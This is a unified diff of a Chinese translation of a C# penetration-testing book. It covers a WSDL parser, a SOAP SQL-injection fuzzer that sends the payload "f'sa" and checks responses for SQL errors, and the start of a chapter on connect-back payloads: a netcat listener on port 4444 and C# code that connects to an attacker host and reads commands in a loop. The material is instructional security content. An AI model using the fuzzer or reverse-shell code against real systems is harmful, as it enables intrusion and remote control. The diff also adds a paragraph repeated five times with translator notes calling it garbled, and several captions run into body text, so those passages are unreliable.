+这就是 WSDL 类的部分。一个构造函数和几个存储与 WSDL 文档相关数据的属性就是你所需的所有内容。现在我们需要实现辅助类。在解析方法中，我们使用尚未实现的类（`SoapType`、`SoapMessage`、`SoapPortType`、`SoapBinding`、`SoapService`）。我们将从`SoapType`类开始。
 
 ## 为 SOAP 类型和参数编写类
 
-为了完成 `ParseTypes()` 方法，我们需要实现 `SoapType` 类。`SoapType` 类是一个相对简单的类。它只需要一个构造函数几个属性，如列表 3-6 所示。
+为了完成`ParseTypes()`方法，我们需要实现`SoapType`类。`SoapType`类是一个相对简单的类。它只需要一个构造函数几个属性，如列表 3-6 所示。
+
+
 
 ```csharp
 public class SoapType
@@ -2346,11 +2438,11 @@ public class SoapType
 }
 ```
 
-> 列表 3-6：SoapType 类
+> 列表 3-6：`SoapType` 类
 
 `SoapType` 类是一个相对简单的类。它只需要一个构造函数和几个属性，如列表 3-6 所示。
 
-`SoapType` 类具有两个属性：一个 `string` 和一个 `SoapTypeParameter` 列表。我们在构造函数中使用 `Attributes` 属性来获取名称。我们还实例化了 `Parameters` 列表并将其赋值。使用 `HasChild` 属性，我们可以判断是否需要遍历子节点。
+`SoapType` 类具有两个属性：一个 `string` 和一个 `SoapTypeParameter` 列表。我们在构造函数中使用 `Attributes` 属性来获取名称。我们还实例例化了 `Parameters` 列表并将其赋值。使用 `HasChild` 属性，我们可以判断是否需要遍历子节点。
 
 如果节点有子节点，我们就遍历它们。每个 `XmlNode` 都有 `FirstChild` 属性和返回可枚举列表的 `ChildNodes` 属性。传递给 `SoapType` 构造函数的 XML 示例见列表 3-7。
 
@@ -2365,7 +2457,7 @@ public class SoapType
 </element>
 ```
 
-> 列表 3-7：示例 SoapType XML
+> 列表 3-7：示例 `SoapType` XML
 
 现在我们来考虑 `SoapParameter` 类。该类也相对简单。事实上，不需要遍历子节点，只需要收集基础信息，如列表 3-8 所示。
 
@@ -2388,7 +2480,7 @@ public string Name { get; set; }
 public string Type { get; set; }
 ```
 
-> 列表 3-8：SoapParameter 类
+> 列表 3-8：`SoapParameter` 类
 
 传递到 `SoapParameter` 构造函数的 XML 示例见列表 3-9。
 
@@ -2398,26 +2490,24 @@ public string Type { get; set; }
 
 > 列表 3-9：示例
 
-
-
-
-
-## 传递给 SoapTypeParameter 构造函数的 XML 节点
+## 传递给 `SoapTypeParameter` 构造函数的 XML 节点
 
 给定这样的 XML 节点，我们可以预期方法中会发生几件事。首先，这是一个非常基本的 WSDL 参数，定义了参数 `username` 的类型为 `string`。它至少出现零次，最多出现一次。仔细观察列表 3-8 中的代码，你会发现有一个 `if` 语句在检查 `maxOccurs` 的值。与 `minOccurs` 不同，`maxOccurs` 可以是一个整数或字符串值 `unbounded`，因此在将它传递给 `int.Parse()` 方法之前，我们需要检查 `maxOccurs` 的值是多少。
 
 在我们的 `SoapTypeParameter` 构造函数中，我们首先根据节点的 `maxOccurs` 属性分配 `MaximumOccurrence` 属性。然后，我们根据相应的节点属性分配 `MinimumOccurrence`、`Name` 和 `Type` 属性。
 
-## 创建 SoapMessage 类以定义数据集
+## 创建 `SoapMessage` 类以定义数据集
 
 SOAP 消息定义了一组 Web 服务针对特定操作发送或响应的数据。它引用了之前解析的 SOAP 类型和参数，用于展示数据或从客户端应用程序消耗数据，并由“部分”（parts）组成，这是技术术语。在 SOAP 1.1 消息的示例中，列表 3-10 提供了一个 XML 元素。
 
-```
+```xml
 <message name="AddUserHttpGet">
   <part name="username" type="string"/>
   <part name="password" type="string"/>
-</message>  3-10: 示例 SOAP message XML 元素
+</message>
 ```
+
+> 列表 3-10：示例 SOAP message XML 元素
 
 我们的 `SoapMessage` 类消耗类似于列表 3-10 中的 XML 元素，其详细信息见列表 3-11。
 
@@ -2437,7 +2527,7 @@ public class SoapMessage {
 }
 ```
 
-列表 3-11: SoapMessage 类
+> 列表 3-11：`SoapMessage` 类
 
 首先，我们将消息名称分配给 `SoapMessage` 类的 `Name` 属性。当我们实例化一个名为 `SoapMessagePart` 的新列表并遍历每个 `<part>` 元素时，会将该元素传递给 `SoapMessagePart` 构造函数，并通过将新的 `SoapMessagePart` 添加到 `Parts` 列表中供稍后使用。
 
@@ -2462,11 +2552,11 @@ public class SoapMessagePart(XmlNode part)
 }
 ```
 
-**列表 3-12: SoapMessagePart 类**
+> 列表 3-12：`SoapMessagePart` 类
 
-`SoapMessagePart` 构造函数接受一个参数，该参数包含 SoapMessage 内部该部分的名称和类型。`SoapMessagePart` 类定义了三个公共属性：部分的 `Name`、`Type` 和 `Element`，它们都是字符串。首先，我们将部分的名称存储在 `Name` 属性中。然后，如果我们有 `element` 属性，则会将 `element` 属性的值分配给 `Element` 属性。如果 `element` 属性不存在，则必须存在 `type` 属性，因此我们分配 `type` 属性的值。对于任何 SOAP 部分，这些属性中只有两个会被设置——一个 SOAP 部分始终有一个 `Name`，以及 `Type` 或 `Element` 中的其中之一。`Type` 的设置取决于该部分是简单类型（如 `string` 或 `integer`）还是 WSDL 中由另一个 XML 元素包含的复杂类型。我们必须为每种参数创建一个类，我们将从实现 `Type` 类开始。
+`SoapMessagePart` 构造函数接受一个参数，该参数包含 `SoapMessage` 内部该部分的名称和类型。`SoapMessagePart` 类定义了三个公共属性：部分的 `Name`、`Type` 和 `Element`，它们都是字符串。首先，我们将部分的名称存储在 `Name` 属性中。然后，如果我们有 `element` 属性，则会将 `element` 属性的值分配给 `Element` 属性。如果 `element` 属性不存在，则必须存在 `type` 属性，因此我们分配 `type` 属性的值。对于任何 SOAP 部分，这些属性中只有两个会被设置——一个 SOAP 部分始终有一个 `Name`，以及 `Type` 或 `Element` 中的其中之一。`Type` 的设置取决于该部分是简单类型（如 `string` 或 `integer`）还是 WSDL 中由另一个 XML 元素包含的复杂类型。我们必须为每种参数创建一个类，我们将从实现 `Type` 类开始。
 
-## 使用 SoapPortType 类定义端口操作
+## 使用 `SoapPortType` 类定义端口操作
 
 在定义 `SoapMessage` 和 `SoapMessagePart` 类以完成列表 3-4 中的 `ParseMessages()` 方法后，我们开始创建 `SoapType` 类，它将完成 `ParsePortTypes()` 方法。SOAP 端口类型定义了给定端口（不要与网络端口混淆）可用操作，其解析细节见列表 3-13。
 
@@ -2484,9 +2574,9 @@ public class SoapType {
 }
 ```
 
-列表 3-13: 在 ParsePortTypes() 方法中使用的 SoapType 类
+> 列表 3-13：在 `ParsePortTypes()` 方法中使用的 `SoapType` 类
 
-这些 SOAP 类的工作模式继续下去：列表 3-13 中的 `SoapType` 类定义了一个接受来自 WSDL 文档的 `XmlNode` 的构造函数。它需要两个公共属性：一个 `SoapOperation` 列表和一个 `Name` 字符串。在 `SoapType` 构造函数中，我们首先将 `Name` 属性分配给 `Name` 性。我们创建一个新的 `SoapOperation` 列表并遍历端口中的每个节点。在过程中，我们将节点传递给 `SoapOperation` 构造函数（将在下一节），并将结果存储在列表中。传递给 `SoapType` 构造函数的 XML 节点示例见列表 3-14。
+这些 SOAP 类的工作模式继续下去：列表 3-13 中的 `SoapType` 类定义了一个接受来自 WSDL 文档的 `XmlNode` 的构造函数。它需要两个公共属性：一个 `SoapOperation` 列表和一个 `Name` 字符串。在 `SoapType` 构造函数中，我们首先将 `Name` 属性分配给 `Name` 属性。我们创建一个新的 `SoapOperation` 列表并遍历端口中的每个节点。在过程中，我们将节点传递给 `SoapOperation` 构造函数（将在下一节），并将结果存储在列表中。传递给 `SoapType` 构造函数的 XML 节点示例见列表 3-14。
 
 ```xml
 <portType name="UserServices">
@@ -2509,7 +2599,7 @@ public class SoapType {
 </portType>
 ```
 
-列表 3-14: 传递给 SoapType 构造函数的示例 portType 节点
+> 列表 3-14：传递给 `SoapType` 构造函数的示例 `portType` 节点
 
 你可以看到，`portType` 元素包含了我们可以执行的操作，例如列出、创建和删除用户。每个操作映射到一个特定的消息，我们在列表 3-11 中解析了它。
 
@@ -2535,16 +2625,13 @@ public class SoapOperation {
 }
 ```
 
-*列表 3-15: SoapOperation 类*
+> 列表 3-15：`SoapOperation` 类
 
-`SoapOperation` 构造函数接受一个 `XmlNode` 作为单个参数。我们完成的第一件事是将 `SoapOperation` 类的名为 `Name` 的属性分配给传递给构造函数的节点元素的名称属性。然后，我们遍历每个子节点，检查元素的名称是否以 "In" 或 "Out" 结尾。如果子节点的名称以 "In" 结尾，则我们将 `Input` 属性分配给输入元素的消息；否则，我们将 `Output` 属性分配给输出元素。
+`SoapOperation` 构造函数接受一个 `XmlNode` 作为单个参数。我们完成的第一件事是将 `SoapOperation` 类的名为 `Name` 的属性分配给传递给构造函数的节点元素的名称属性。然后，我们遍历每个子节点，检查元素的名称是否以 `"In"` 或 `"Out"` 结尾。如果子节点的名称以 `"In"` 结尾，则我们将 `Input` 属性分配给输入元素的消息；否则，我们将 `Output` 属性分配给输出元素。
 
-## 定义 Soap 绑定中使用的协议
+## 定义 `Soap` 绑定中使用的协议
 
 两种类型的绑定是 HTTP 和 SOAP。这似乎是重复的，但 HTTP 绑定通过通用 HTTP 协议传输数据，使用 HTTP 查询字符串或 POST 参数。SOAP 绑定则在简单的 TCP 套接字或命名管道上使用 SOAP 1.0 或 SOAP 1.1 协议，这些协议以 XML 格式封装流向服务器的数据。`SoapBinding` 类允许你根据绑定决定如何与给 SOAP 端口进行通信。
-
-
-
 
 列表 3-16 显示了 ServiceSoap-WSDL 的示例绑定注记。
 
@@ -2562,9 +2649,12 @@ public class SoapOperation {
 </operation>
 </binding>
 ```
-列表 3-16：来自 WSDL 的示例绑定 XML 节点
+
+> 列表 3-16：来自 WSDL 的示例绑定 XML 节点
 
 为了解析此 XML 节点，我们的类需要从绑定节点中提取一些关键信息，如列表 3-17 所示。
+
+
 
 ```csharp
 public class SoapBinding{
@@ -2590,11 +2680,12 @@ public class SoapBinding{
   public string Type { get; set; }
 }
 ```
-列表 3-17：传递给 SoapBinding 构造函数的参数
 
-在接收一个 XmlNode 后，我们首先将节点的 `name` 和 `type` 属性的值赋值给 `SoapBinding` 类的 `Name` 和 `Type` 属性。默认情况下，我们将 `IsHTTP` 布尔值设为 `false`。`IsHTTP` 属性帮助我们决定如何发送想要模糊的数据，是使用 HTTP 参数还是 SOAP XML。
+列表 3-17：传递给 `SoapBinding` 构造函数的参数
 
-当我们遍历子节点时，我们会测试每个子节点的名称是否以 "operation" 结尾 ①，如果是，我们就将操作添加到 `SoapBindingOperation` 列表中。如果子节点的名称不以 "operation" 结尾，则该节点应该是一个 HTTP 绑定。我们通过 `else` 语句确保情况如此，并将子节点 `verb` 属性的 `true` 值赋给 `HTTP` 属性。我们还将 `isHTTP` 设为 `true`。`verb` 属性应包含 `GET` 或 `POST`，这告诉我们发送到 SOAP 端点的数据将是查询字符串 (GET) 参数还是 POST 参数。
+在接收一个 `XmlNode` 后，我们首先将节点的 `name` 和 `type` 属性的值赋值给 `SoapBinding` 类的 `Name` 和 `Type` 属性。默认情况下，我们将 `IsHTTP` 布尔值设为 `false`。`IsHTTP` 属性帮助我们决定如何发送想要模糊的数据，是使用 HTTP 参数还是 SOAP XML。
+
+当我们遍历子节点时，我们会测试每个子节点的名称是否以 `"operation"` 结尾 ①，如果是，我们就将操作添加到 `SoapBindingOperation` 列表中。如果子节点的名称不以 `"operation"` 结尾，则该节点应该是一个 HTTP 绑定。我们通过 `else` 语句确保情况如此，并将子节点 `verb` 属性的 `true` 值赋给 `HTTP` 属性。我们还将 `isHTTP` 设为 `true`。`verb` 属性应包含 `GET` 或 `POST`，这告诉我们发送到 SOAP 端点的数据将是查询字符串 (GET) 参数还是 POST 参数。
 
 接下来，我们将实现 `SoapBindingOperation` 类。
 
@@ -2621,7 +2712,8 @@ public class SoapBindingOperation
     public string SoapAction { get; set; }
 }
 ```
-列表 3-18：传递给构造函数的 SoapBindingOperation，我们首先将 `Name` 属性 ① 赋值为 XML 节点上 `name` 属性的值。
+
+列表 3-18：传递给构造函数的 `SoapBindingOperation`，我们首先将 `Name` 属性 ① 赋值为 XML 节点上 `name` 属性的值。
 
 操作节点包含几个子节点，但我们真正关心三个特定的节点：`operation`、`soapoperation` 和 `soap12operation`。当我们遍历子节点时，我们会检查该操作是 HTTP 操作还是 SOAP 操作。如果是 HTTP 操作 ②，我们存储该操作的端点位置，这是一个像 `/AddUser` 这样的相对 URI。如果是 SOAP 操作，我们存储 `SoapAction`，它在对 SOAP 端点进行 SOAP 调用时，被用在特定的 HTTP 请求头中。当我们编写模糊逻辑时，这些信息将用于将数据发送到正确的端点。
 
@@ -2644,9 +2736,10 @@ public class SoapService{
     public List<SoapPort> Ports { get; set; }
 }
 ```
-列表 3-19：SoapService 类
 
-`Service` 类接受 XML 节点作为构造函数的唯一参数。我们首先将服务的名称赋值给类的 `Name` 属性，然后创建一个新的端口列表。当我们遍历服务节点的子节点时，我们使用每个子节点创建一个 `SoapPort` 对象并将其添加到 `Ports` 列表中。列表 3-20 显示了带有四个子节点的 WSDL  XML 节点。
+列表 3-19：`SoapService` 类
+
+`Service` 类接受 XML 节点作为构造函数的唯一参数。我们首先将服务的名称赋值给类的 `Name` 属性，然后创建一个新的端口列表。当我们遍历服务节点的子节点时，我们使用每个子节点创建一个 `SoapPort` 对象并将其添加到 `Ports` 列表中。列表 3-20 显示了带有四个子节点的 WSDL XML 节点。
 
 ```xml
 <service name="VulnerableService">
@@ -2664,6 +2757,7 @@ public class SoapService{
   </port>
 </service>
 ```
+
 列表 3-20：来自 WSDL 的服务节点
 
 最后要做的是实现 `SoapPort` 类以完成用于模糊的 WSDL。`SoapPort` 类如列表 3-21 所示。
@@ -2683,11 +2777,10 @@ public class SoapPort{
     public string Location { get; set; }
 }
 ```
-列表 3-21：SoapPort 类
+
+列表 3-21：`SoapPort` 类
 
 为了完成用于模糊的 WSDL，我们需要从端口节点获取几个属性。我们首先将端口名称存储在 `Name` 属性中，将绑定存储在 `Binding` 属性中。然后，通过 `FirstChild` 属性 ② 引用唯一子节点，将该子节点的名称和位置数据存储在 `ElementType` 和 `Location` 属性中。
-
-
 
 ```csharp
 _wsdl = new WSDL(wsdlDoc);
@@ -2699,13 +2792,13 @@ foreach (SoapService service in _wsdl.Services)
 }
 ```
 
-列表 3-22：SOAP 端点模糊器的 Main() 方法在 Main() 方法执行之前在类级别解耦了几个静态变量。
+列表 3-22：SOAP 端点模糊器的 `Main()` 方法在 `Main()` 方法执行之前在类级别解耦了几个静态变量。
 
-这些变量将在我们编写的方法中一直使用。第一个变量是 WSDL 类 ❶，第二个存储指向 SOAP 端点的 URL ➁。
+这些变量将在我们编写的方法中一直使用。第一个变量是 `WSDL` 类 ❶，第二个存储指向 SOAP 端点的 URL ➁。
 
-在 Main() 方法中，我们将 `_endpoint` 变量赋值为传递给模糊器的第一个参数的值 ➁，并打印一条友好的消息提醒用户我们正准备获取 SOAP 服务的 WSDL。
+在 `Main()` 方法中，我们将 `_endpoint` 变量赋值为传递给模糊器的第一个参数的值 ➁，并打印一条友好的消息提醒用户我们正准备获取 SOAP 服务的 WSDL。
 
-在存储端点 URL 后，我们创建了一个新的 `HttpRequest`，通过在端点 URL 末尾添加 `?WSDL` 来从 SOAP 服务检索 WSDL。我们还创建了一个临时的 `XmlDocument` 来存储 WSDL，并将其传递给 SOAP 类构造函数。通过将 HTTP 响应传递给 `XmlDocument.Load()` 方法 ➏，我们将 HTTP 请求的 XML 加载到 `XmlDocument` 中。然后，我们将生成的 XML 文档传递给 WSDL 类构造函数以创建一个新的 WSDL 对象。现在，我们可以遍历每个 SOAP 服务并对其进行模糊测试。一个 `foreach` 循环遍历 WSDL 类 `Services` 属性中的对象，并将每个服务传递给 `FuzzService()` 方法，我们将在下一节中编写该方法。
+在存储端点 URL 后，我们创建了一个新的 `HttpRequest`，通过在端点 URL 末尾添加 `?WSDL` 来从 SOAP 服务检索 WSDL。我们还创建了一个临时的 `XmlDocument` 来存储 WSDL，并将其传递给 SOAP 类构造函数。通过将 HTTP 响应传递给 `XmlDocument.Load()` 方法 ➏，我们将 HTTP 请求的 XML 加载到 `XmlDocument` 中。然后，我们将生成的 XML 文档传递给 `WSDL` 类构造函数以创建一个新的 `WSDL` 对象。现在，我们可以遍历每个 SOAP 服务并对其进行模糊测试。一个 `foreach` 循环遍历 `WSDL` 类 `Services` 属性中的对象，并将每个服务传递给 `FuzzService()` 方法，我们将在下一节中编写该方法。
 
 ## 模糊测试单个 SOAP 服务
 
@@ -2729,7 +2822,7 @@ static void FuzzService(SoapService service)
 }
 ```
 
-列表 3-23：用于确定如何模糊 SoapService 的 `FuzzService()` 方法
+列表 3-23：用于确定如何模糊 `SoapService` 的 `FuzzService()` 方法
 
 在打印出当前要模糊测试的服务后，我们遍历 `Ports` 服务属性中的每个 SOAP 端口。使用语言集成查询 (LINQ) 的 `Single()` ①，我们选择与当前端口对应的单个 `SoapBinding`。然后，我们测试该绑定是纯 HTTP 还是基于 XML 的 SOAP。如果绑定是 HTTP 绑定 ②，我们将将其传递给 `FuzzHttpPort()` 方法进行模糊测试。否则，我们假设绑定是 SOAP 绑定并将其传递给 `FuzzHttpPort()` 方法。
 
@@ -2748,7 +2841,7 @@ else
 
 列表 3-24：`FuzzHttpPort()` 方法非常简单。它测试 `SoapBinding`
 
-`FuzzHttpPort()` 方法测试 `Soap` 属性是否等于 GET 或 POST，然后将绑定分别传递给相应的方法——`FuzzHttpGetPort()` 或 `FuzzHttpPostPort()`。如果 `Verb` 既不等于 GET 也等于 POST，则抛出异常提醒用户我们不知道如何处理给定的 HTTP 动词。
+`FuzzHttpPort()` 方法测试 `Soap` 属性是否等于 `GET` 或 `POST`，然后将绑定分别传递给相应的方法——`FuzzHttpGetPort()` 或 `FuzzHttpPostPort()`。如果 `Verb` 既不等于 `GET` 也等于 `POST`，则抛出异常提醒用户我们不知道如何处理给定的 HTTP 动词。
 
 现在我们已经创建了 `FuzzHttpPort()` 方法，我们将实现 `FuzzHttpGetPort()` 方法。
 
@@ -2771,9 +2864,9 @@ foreach (SoapOperation op in portType.Operations)
 
 首先，我们定义了一个布尔值，我们将使用它来
 
+```csharp
 Dictionary<string, string> parameters = new Dictionary<string, string>();
 
-```csharp
 bool first = true;
 List<Guid> guidList = new List<Guid>();
 foreach (var param in parameters)
@@ -2797,6 +2890,8 @@ foreach (var param in parameters)
 ## 模糊创建的 URL
 
 创建带有查询参数的 URL 后，我们可以系统地将参数值替换为可能导致服务器产生 SQL 错误的恶意值来发送 HTTP 请求，如列表 3-26 所示。这段代码的后半部分完成了 `FuzzHttpGetPort()` 方法。
+
+
 
 ```csharp
 Console.WriteLine("Fuzzing full url: " + url);
@@ -2824,10 +2919,7 @@ foreach(Guid guid in guidList)
 }
 ```
 
-
-
-
-列表 3-26：FuzzHttpGetPort() 方法的后半部分，发送 HTTP 请求
+列表 3-26：`FuzzHttpGetPort()` 方法的后半部分，发送 HTTP 请求
 
 现在我们已经有了要进行模糊测试的完整 URL，我们将其打印出来供用户查看。我们还声明了一个整数 `k`，在遍历 URL 中的参数值时对其递增，以便跟踪可能存在漏洞的参数。然后，使用 `foreach` 循环遍历 `Guid` 列表，我们做的第一件事是使用 `Replace()` 方法将 URL 中的当前 `Guid` 替换为字符串 `"f'sa"`，我们试图在不进行妥当过滤的情况下使用该值来污染任何 SQL 查询。然后，我们使用修改后的 URL 创建一个新的 HTTP 请求，并声明一个名为 `resp` 的空字符串来存储 HTTP 响应。
 
@@ -2927,21 +3019,18 @@ foreach (Guid guid in guides)
 
 在 `try/catch` 块中，我们尝试使用 `StreamReader` 从服务器读取 HTTP 请求的响应。如果服务器返回 500 错误（当服务器端发生 SQL 异常时就会发生），读取响应将导致异常。如果抛出异常，我们会在 `catch` 块中捕获异常并尝试再次从服务器读取响应。如果响应包含字符串 `syntax error`，我们将打印一条消息，提醒用户当前 HTTP 参数可能存在 SQL 注入漏洞。为了准确告诉用户是哪个参数可能存在漏洞，我们使用整数 `k` 作为 `Parts` 列表的索引，并获取当前属性的 `Name`。完成后，我们将整数 `k` 增 1，并从 `foreach` 循环开始使用一个新值进行测试。
 
-
-
-
 ## 构建动态 SOAP XML 的初始信息收集
 
 与 GET 和 POST 模糊测试方法一样，在进行任何操作之前，我们需要收集一些关于将要模糊测试内容的信息。首先，我们使用 LINQ 从 `_wsdl.PortTypes` 中获取相应的 `SoapType`；然后使用 `foreach` 循环遍历每个操作（operation）。在遍历过程中，我们在控制台中打印当前正在进行模糊测试的操作。为了向服务器发送正确的 XML，我们需要选择与传递给方法的 `SoapBinding` 类相对应的 `SoapOperation` 类和 `SoapMessage` 类。通过使用 `SoapOperation` 和 `SoapMessage`，我们可以动态地构建 XML。为了实现这一点，我们使用了 LINQ to XML，它是 `System.Xml` 命名空间中的一组内置类，允许我们创建如列表 3-31 所示的动态 XML。
 
-```
+```csharp
 XNamespace soapNS = "http://schemas.xmlsoap.org/soap/envelope/";
 XNamespace xmlNS = soapAction.Replace(op.Name, string.Empty);
 XElement body = new XElement(soapNS + "Body");
 XElement soapOperation = new XElement(xmlNS + param.Name);
 ```
 
-```
+```csharp
 soapBody.Add(soapOperation);
 
 List<Guid> list = new List<Guid>();
@@ -2963,11 +3052,11 @@ foreach (SoapTypeParameter in type.Parameters)
 
 构建 XML 时，我们创建了两个 `XNamespace` 实例。第一个 `XNamespace` 是默认 SOAP 命名空间，但第二个 `XNamespace` 将根据当前操作的 `SoapAction` 属性发生变化。定义命名空间后，我们使用 `XElement` 类创建两个新的 `XElement` 元素。第一个 `XElement`（将称为 `<body>`）是 SOAP 中使用的标准 XML 元素，封装当前 SOAP 操作的数据。第二个 `XElement` 将根据当前操作命名。`XElement` 实例分别使用默认的 SOAP 命名空间和 SOAP 操作命名空间。然后我们使用 `XElement.Add` 方法将第二个 `XElement` 添加到第一个中，这样 SOAP `<body>` XML 元素就会包含 SOAP 操作元素。
 
-在创建了外部 XML 元素后，我们创建了一个 `Guid` 来存储生成的值，并选择了当前的 `SoapType` LINQ ③，以便我们可以遍历 SOAP 调用所需的参数。在遍历过程中，我们首先为当前参数 ④ 创建一个新的 `XElement`。如果参数类型是字符串，我们使用 `SetValue()` ⑤ 为该 `XElement` 分配一个 `Guid` 值，并将该 `Guid` 存在 Guid 列表中供稍后引用。然后我们将 `XElement` 添加到 SOAP 操作元素中，并处理下一个参数。
+在创建了外部 XML 元素后，我们创建了一个 `Guid` 来存储生成的值，并选择了当前的 `SoapType` LINQ ③，以便我们可以遍历 SOAP 调用所需的参数。在遍历过程中，我们首先为当前参数 ④ 创建一个新的 `XElement`。如果参数类型是字符串，我们使用 `SetValue()` ⑤ 为该 `XElement` 分配一个 `Guid` 值，并将该 `Guid` 存在 `Guid` 列表中供稍后引用。然后我们将 `XElement` 添加到 SOAP 操作元素中，并处理下一个参数。
 
 一旦完成将参数添加到 SOAP 操作 XML 节点，我们需要将整个 XML 文档组合在一起，如 [列表 3-32](#) 所示。
 
-```
+```csharp
 XDocument soapDoc = new XDocument(new XDeclaration("1.0", "ascii", "true"),
 new XElement(soapns + "Envelope",
     new XAttribute("xmlns", soapns),
@@ -2979,7 +3068,7 @@ new XElement(soapns + "Envelope",
 
 现在 XML 已经准备就绪，我们可以 SOAP 发送到 Web 服务器并尝试引发 SQL 错误。继续将此代码添加到 `FuzzSoapPoint()` 方法中。
 
-```
+```csharp
 int k = 0;
 foreach (Guid param in paramList)
 {
@@ -2994,15 +3083,13 @@ foreach (Guid param in paramList)
         stream.Write(data, 0, data.Length); // 3-33：创建 HttpWebRequest 以将 SOAP XML 发送到 SOAP 端点
 ```
 
-正如本章之前涵盖的故障一样，我们遍历为构建 SOAP 操作 XML 时创建的值列表中的每个 Guid。在遍历过程中，我们将 SOAP XML 体中的当前 Guid 替换为某个值，如果该值被用于 SQL 查询，则将会引发 SQL 错误 ⑧。在将 Guid 替换为污染值后，我们使用 `GetBytes()` 方法将生成的字符串转换为字节数组，我们将以 POST 形式将其写入 HTTP 流。
 
-然后我们构建将用于发出 HTTP 请求并读取结果的 `HttpWebRequest`。需要注意的一个特殊点是 `SOAPAction` 头部 ?。此 SOAPAction HTTP 头部将被 SOAP 端点用于确定使用数据执行什么操作，例如列出或删除用户。我们还将 HTTP 方法设置为 POST，内容类型设置为 `text/xml`，内容长度设置为 `data.Length`。
 
-[content]
+正如本章之前涵盖的故障一样，我们遍历为构建 SOAP 操作 XML 时创建的值列表中的每个 `Guid`。在遍历过程中，我们将 SOAP XML 体中的当前 `Guid` 替换为某个值，如果该值被用于 SQL 查询，则将会引发 SQL 错误。在将 `Guid` 替换为污染值后，我们使用 `GetBytes()` 方法将生成的字符串转换为字节数组，我们将以 POST 形式将其写入 HTTP 流。
+
+然后我们构建将用于发出 HTTP 请求并读取结果的 `HttpWebRequest`。需要注意的一个特殊点是 `SOAPAction` 头部。此 `SOAPAction` HTTP 头部将被 SOAP 端点用于确定使用数据执行什么操作，例如列出或删除用户。我们还将 HTTP 方法设置为 POST，内容类型设置为 `text/xml`，内容长度设置为 `data.Length`。
+
 ## 结论
-
-
-
 
 在本章中，你学习了核心库中提供的 XML 类。我们使用 XML 类实现了一个完整的 SOAP 服务 SQL 注入模糊器，并涵盖了与 SOAP 服务交互的几种方法。
 
@@ -3010,9 +3097,7 @@ foreach (Guid param in paramList)
 
 C# 中功能强大的 XML 类让消费和处理 XML 变得轻而易举。由于许多企业级技术依赖 XML 进行跨平台通信、序列化或存储，了解如何高效地读取和创建 XML 文档将非常有用，特别是对于安全工程师或渗透测试员。
 
-# 4
-编写反弹（CONNECT-BACK）、
-绑定（BINDING）以及 METASPLOIT 载负载
+# 4 编写反弹（CONNECT-BACK）、绑定（BINDING）以及 METASPLOIT 载负载
 
 ![](img/059a0f6a8101e80261ab133380da85bd_105_0.png)
 
@@ -3026,19 +3111,19 @@ C# 中功能强大的 XML 类让消费和处理 XML 变得轻而易举。由于�
 
 ## 网络流（Network Stream）
 
-我们将使用大多数类 Unix 操作系统提供的 `netcat` 工具来测试我们的绑定和反弹载负载。大多数 Unix 操作系统都预装了 netcat，但如果你想在 Windows 上使用它，必须通过 Cygwin 或作为独立二进制文件下载该工具（或从源码编译！）。首先，设置 netcat 监听来自目标的返回连接，如 4-1 所示。
+我们将使用大多数类 Unix 操作系统提供的 `netcat` 工具来测试我们的绑定和反弹载负载。大多数 Unix 操作系统都预装了 `netcat`，但如果你想在 Windows 上使用它，必须通过 Cygwin 或作为独立二进制文件下载该工具（或从源码编译！）。首先，设置 `netcat` 监听来自目标的返回连接，如 4-1 所示。
 
 ```
 $ nc -l 4444
 ```
 
-> 列表 4-1：使用 netcat 监听端口 4444
+> 列表 4-1：使用 `netcat` 监听端口 4444
 
 我们的反弹载负载需要创建一个网络流以便读取和写入。如列表 4-2 所示，载负载 `Main()` 方法的前几行根据传递给载负载的参数创建了该流供后续使用。
 
 > 列表 4-2：流类的构造函数接收两个参数：要连接的主机
 
-一个字符串和一个要连接到主机的端口（int 类型）。使用传递给载负载的参数，并假设第一个参数是要连接的主机，我们将参数传递给 `TcpClient` 构造函数。由于默认参数是字符串，我们不需要将其转换为任何特殊类型，只需转换端口即可。
+一个字符串和一个要连接到主机的端口（`int` 类型）。使用传递给载负载的参数，并假设第一个参数是要连接的主机，我们将参数传递给 `TcpClient` 构造函数。由于默认参数是字符串，我们不需要将其转换为任何特殊类型，只需转换端口即可。
 
 指定要连接端口的第二个参数必须以 `int` 类型给出。为了实现这一点，我们使用 `int.Parse()` 静态方法将第二个参数从字符串转换为 `int`。（C# 中的许多类型都有一个静态的 `Parse()` 方法，可以将一种类型转换为另一种类型。）在实例化 `TcpClient` 后，我们调用客户端的 `GetStream()` 并将其赋值给变量 `stream`，我们通过它进行读取和写入。最后，我们将流传递给 `StreamReader` 类，以便我们能够轻松地读取攻击者的命令。
 
@@ -3063,71 +3148,21 @@ while (true)
     string filename = split.First();
     string arg = string.Join(" ", split.Skip(1));
 }
-``` 列表 4-3：从流读取命令并从命令参数中解析命令
+```
 
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱，已按原意翻译）。
+列表 4-3：从流读取命令并从命令参数中解析命令
 
-在.无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
-在无限循环中，`StreamReader ReadLine()` 方法从流中读取一行数据，然后将其赋值给变量 `cmd`。我们根据换行符在数据流中出现的位置来确定是哪行数据。只要我们从 `netcat` 监听器发送命令，就需要对从流的读取操作进行载负载处理。为此我们将使用列表 4-2 中创建的内容，如列表 4-3 所示。（注：此处原文逻辑似乎有重复或错乱）。
-
